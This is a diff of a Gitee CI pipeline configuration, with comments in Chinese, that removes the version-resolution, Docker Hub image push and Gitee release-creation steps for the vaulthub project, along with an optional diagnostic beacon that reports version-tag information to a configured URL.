-            elif [ -z "$TAG" ]; then
-              echo "❌ 本次提交上没有任何版本 tag —— 拒绝发布。"
-              echo "   发布必须：先把 tag vX.Y.Z 打在要发布的提交上，再推 release-vX.Y.Z 分支。"
-              exit 1
-            else
-              echo "  ⚠️ 远端没有指向本次提交的版本 tag，但系统变量里读到 $TAG —— 按 $TAG 继续"
-              echo "     （创建发行版那一步会用 Gitee API 再校验一次 tag）"
-            fi
-
-            case "$TAG" in
-              v[0-9]*.[0-9]*.[0-9]*) : ;;
-              [0-9]*.[0-9]*.[0-9]*)  TAG="v${TAG}" ;;
-              *) echo "❌ 版本号形态不对: '$TAG'"; exit 1 ;;
-            esac
-            VERSION="${TAG#v}"
-            NOTES=".github/RELEASE_NOTES_${VERSION}.md"
-            if [ ! -f "$NOTES" ]; then
-              echo "❌ 找不到发布说明 $NOTES —— 拒绝创建没有说明的发行版。"
-              exit 1
-            fi
-            echo "✅ 版本=$TAG  说明=$NOTES（$(wc -c < "$NOTES" | tr -d ' ') 字节）"
-            echo "VH_TAG=$TAG" >> GITEE_PARAMS
-            echo "VH_VERSION=$VERSION" >> GITEE_PARAMS
-            echo "VH_LATEST=latest" >> GITEE_PARAMS
-            echo "  已写入流水线参数：VH_TAG / VH_VERSION / VH_LATEST（下游步骤引用）"
-            # ---- 诊断信标 ③（step1-end）：版本解析完成 ----
-            VH_TAG="$TAG" VH_LOOKUP="$LOOKUP" VH_REMOTE_TAG="$REMOTE_TAG" python3 - <<'PY' || true
-            import json, os, sys, urllib.request
-            url = os.environ.get("VH_BEACON_URL", "")
-            if not url:
-                sys.exit(0)
-            info = {
-                "beacon": "step1-end",
-                "VH_TAG": os.environ.get("VH_TAG", ""),
-                "lookup": os.environ.get("VH_LOOKUP", ""),
-                "remote_tag": os.environ.get("VH_REMOTE_TAG", ""),
-            }
-            try:
-                req = urllib.request.Request(url, data=json.dumps(info, ensure_ascii=False).encode(),
-                                             headers={"Content-Type": "application/json"})
-                urllib.request.urlopen(req, timeout=25)
-                print("  信标已发出（step1-end）")
-            except Exception as e:
-                print("  信标发送失败（不影响构建）：%s" % str(e)[:120])
-            PY
-
-      # ================================================== ② 构建并推送版本镜像
-      # 对应旧工作流的 docker/build-push-action + ghcr.io → 现为 Docker Hub。
-      # Gitee 的 build@docker 只接受**单个** tag 值。
-      - step: build@docker
-        name: build_push_version
-        displayName: 构建并推送 vX.Y.Z
-        # 镜像仓库地址（对应旧流程的 registry: ghcr.io → 现为 docker.io）
-        repository: docker.io
-        # 这两项在「流水线 → 通用变量」里配置，不要写进本文件
-        username: ${DOCKERHUB_USERNAME}
-        password: ${DOCKERHUB_TOKEN}
-        # 版本标签。${VH_TAG} 由第①步写入；没写进去就会退化成非法 tag 并让本步失败，
-        # 这比静默推一个错标签好。
-        tag: q807738511/vaulthub:${VH_TAG}
-        dockerfile: ./Dockerfile
-        # 与旧流程一致：全量重建，不吃缓存
-        isCache: false
-
-      # ================================================== ③ 构建并推送 latest
-      # 生产 compose 用的是 :latest + pull_policy: always，不更新 latest 生产就升不上来。
-      # ⚠️ ${VH_LATEST} 由第①步写入（值恒为 latest）。这样写是为了**保险**：
-      #    万一第①步没跑成，这里会变成非法 tag 而失败，绝不会把某个提交推成 latest
-      #    从而让生产静默换到没发布的版本上。
-      # ⚠️ 代价：镜像会被构建第二遍，构建分钟翻倍（免费额度 = 单仓库 200 分钟 + 每月 500 分钟）。
-      #    如果改用 NAS 上的 scripts/release-nas.sh 发布（一次推 vX.Y.Z / latest /
-      #    sha-xxxxxxx 三个 tag，零构建分钟），把这一步整段删掉即可。
-      - step: build@docker
-        name: build_push_latest
-        displayName: 构建并推送 latest
-        repository: docker.io
-        username: ${DOCKERHUB_USERNAME}
-        password: ${DOCKERHUB_TOKEN}
-        tag: q807738511/vaulthub:${VH_LATEST}
-        dockerfile: ./Dockerfile
-        isCache: true
-
-      # ================================================== ④ 创建 Gitee 发行版
-      # 用 build@python 是刻意的：scripts/ci-release.sh 依赖 curl + python3，
-      # 选 Python 插件可以保证 runner 上一定有 python3（并顺手证明 curl 在不在）。
-      # 真正的发布逻辑在脚本里：既能在 CI 跑，也能在 NAS 上手动跑，还能在本地用
-      # curl 桩程序做完整回归（tests/test_v0970_release_step_logic.py）。
-      - step: build@python
-        name: create_release
-        displayName: 创建 Gitee 发行版（幂等 + 重试 + 读回校验）
-        pythonVersion: '3.9'
-        commands:
-          - |
-            set -e
-            echo "================ 环境自检 ================"
-            for t in curl python3 git; do
-              printf '  %-8s ' "$t"
-              command -v "$t" >/dev/null 2>&1 && "$t" --version 2>&1 | head -1 || echo "【缺失】"
-            done
-
-            echo "================ 参数确认 ================"
-            echo "  VH_TAG=${VH_TAG:-<未设置>}  VH_VERSION=${VH_VERSION:-<未设置>}"
-            if [ -z "${VH_TAG}" ]; then
-              echo "❌ 上游「解析版本号」没有跑成，拿不到 VH_TAG —— 拒绝创建发行版。"
-              exit 1
-            fi
-            NOTES=".github/RELEASE_NOTES_${VH_VERSION}.md"
-            echo "  发行版=$VH_TAG  说明=$NOTES"
-
-            # 仓库 slug 用 Gitee 的 enged/vaulthub
-            # （不是 Docker Hub 的 q807738511/vaulthub，这两个别搞混）
-            export VH_GITEE_TOKEN="${VH_GITEE_TOKEN}"
-            sh scripts/ci-release.sh "${VH_TAG}" "$NOTES" "enged/vaulthub"
+      - release-
+      precise: []
+      include: []
+notify: []
+variables:
+  global:
+  - DOCKERHUB_USERNAME
+  - DOCKERHUB_TOKEN
+  - VH_GITEE_TOKEN
